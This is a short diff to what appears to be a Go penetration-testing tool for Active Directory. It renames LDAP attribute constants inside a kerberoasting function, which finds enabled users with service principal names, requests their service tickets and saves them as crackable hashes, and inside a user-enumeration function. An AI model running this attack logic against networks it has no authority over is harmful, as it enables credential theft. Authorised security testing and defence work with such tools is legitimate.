@@ -192,7 +192,7 @@ func (o *LdapOptions) kerberoast(target string) error {
 	ldapFilter := ldap.JoinFilters(
 		ldap.FilterIsUser,
 		ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
-		ldap.NewFilter(ldap.AttributeServicePrincipalName, "*"),
+		ldap.NewFilter(ldap.ServicePrincipalName, "*"),
 	)
 	defer lclient.Close()
 
@@ -210,8 +210,8 @@ func (o *LdapOptions) kerberoast(target string) error {
 	return lclient.FindObjectsWithCallback(ldapFilter, func(users []map[string]string) error {
 		var res []string
 		for _, entry := range users {
-			usr := entry[ldap.AttributeSAMAccountName]
-			spn := entry[ldap.AttributeServicePrincipalName]
+			usr := entry[ldap.SAMAccountName]
+			spn := entry[ldap.ServicePrincipalName]
 			tgs, err := krb5client.GetServiceTicket(usr, spn)
 			if err != nil {
 				return err
@@ -224,7 +224,7 @@ func (o *LdapOptions) kerberoast(target string) error {
 			return fmt.Errorf("[%s] no kerberoastable user found on target", target)
 		}
 		return writeLines(res, o.Hashes.Kerberoast)
-	}, ldap.AttributeSAMAccountName, ldap.AttributeServicePrincipalName)
+	}, ldap.SAMAccountName, ldap.ServicePrincipalName)
 }
 
 func (o *LdapOptions) enumeration(target string) error {
@@ -244,11 +244,11 @@ func (o *LdapOptions) enumeration(target string) error {
 		for _, entry := range m {
 			fmt.Printf("[%s]-[%s\\%s]  %s\\%s\n",
 				target, o.Connection.Domain, creds.String(),
-				o.Connection.Domain, entry[ldap.AttributeSAMAccountName],
+				o.Connection.Domain, entry[ldap.SAMAccountName],
 			)
 		}
 		return nil
-	}, ldap.AttributeSAMAccountName)
+	}, ldap.SAMAccountName)
 }
 
 func (o *LdapOptions) domainSID(target string) error {
